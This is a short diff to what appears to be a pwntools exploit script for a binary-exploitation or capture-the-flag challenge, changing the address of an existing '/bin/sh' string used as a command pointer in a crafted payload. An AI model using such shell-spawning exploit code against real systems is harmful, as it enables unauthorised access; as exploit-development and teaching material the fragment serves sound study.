@@ -26,7 +26,7 @@ input("Press Enter when GDB is properly connected...")
 p.recvuntil(b"pwn: ")
 
 # Use the existing /bin/sh string at 0x10077a8c
-cmd_addr = 0x407ffd38
+cmd_addr = 0x100bef28 - 8
 
 # Craft payload
 payload = p32(cmd_addr)
